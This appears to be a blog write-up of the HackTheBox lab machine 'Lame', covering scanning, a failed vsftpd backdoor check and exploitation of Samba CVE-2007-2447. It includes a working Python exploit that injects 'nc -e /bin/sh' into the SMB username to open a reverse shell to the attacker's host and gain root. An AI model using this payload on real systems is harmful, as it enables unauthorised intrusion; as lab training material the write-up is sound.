---
layout: post
title: HackTheBox&#58; Lame
description: Writeup for HTB box Lame.
category: HackTheBox
---

### Introduction

Lame is a Linux box, difficulty Easy on HTB.
It's the first box ever created on HTB and it's very easy (just like the name suggests)

### Initial Scan

![Lame-1](/resources/Lame-1.png)

### FTP

We see vsftpd 2.3.4 running on the server.
It has [a well-known backdoor](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html).
However a quick test using telnet shows no result, which means the server is likely not vulnerable.
Anonymous login also shows us no files.

### Samba

From nmap results, we know that the machine is running Samba version 3.0.20.
searchsploit gets a hit with 1 Metasploit module: [CVE-2007-2447](https://www.cvedetails.com/cve/CVE-2007-2447).

The vulnerability affects all versions from 3.0.0 to 3.0.25rc3.
Since we are trying to avoid using Metasploit, we can quickly write an exploit script based on the Ruby script.

```Python
from smb.SMBConnection import SMBConnection

LHOST, LPORT = "10.10.14.25", 1337
RHOST, RPORT = "10.10.10.3", 139

def main():
    payload = "nc -e /bin/sh {} {}".format(LHOST, LPORT)
    username = "/-`nohup {}`".format(payload)
    try:
        smb = SMBConnection(username, "", "", "", "")
        smb.connect(RHOST, RPORT)
        print "[+] Payload sent."
    except Exception as e:
        print "[-] Something went wrong."
        print "[-] Error: {}".format(e)

if __name__ == "__main__":
    main()
```

![Lame-2](/resources/Lame-2.png)

We get reverse shell as root immediately and we can read both user.txt and root.txt.
